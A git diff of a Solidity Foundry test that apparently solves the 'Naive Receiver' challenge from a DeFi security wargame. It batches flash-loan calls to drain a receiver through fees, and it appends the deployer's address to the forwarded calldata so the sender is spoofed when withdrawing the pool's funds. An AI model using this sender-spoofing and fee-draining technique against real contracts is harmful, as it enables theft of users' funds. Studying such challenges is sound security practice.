@@ -83,7 +83,7 @@ contract NaiveReceiverChallenge is Test {
         console.log(weth.balanceOf(address(receiver)));
 
       uint256 times = 10;
-      bytes[] memory data = new bytes[](times);                                                                                        
+      bytes[] memory data = new bytes[](times +1);                                                                                        
 
         // drain user's wallet with fees
         for (uint256 index = 0; index < times; index++) {
@@ -92,9 +92,9 @@ contract NaiveReceiverChallenge is Test {
             0,"");
         }
 
-        data[10] = abi.encodeWithSelector(pool.withdraw.selector,WETH_IN_RECEIVER + WETH_IN_POOL,address(recovery));
+        // append deployer to the call data
+        data[10] = abi.encodeWithSelector(pool.withdraw.selector,WETH_IN_RECEIVER + WETH_IN_POOL,payable(recovery),address(deployer));
 
-        console.log(data)
         // spoof receiver
         BasicForwarder.Request memory request = BasicForwarder.Request({
             from :address(player),
@@ -118,6 +118,7 @@ contract NaiveReceiverChallenge is Test {
         bytes memory signature = abi.encodePacked(r,s,v);
         forwarder.execute(request,signature);
         console.log(weth.balanceOf(address(receiver)));
+        // console.log(data);
         
         
     }
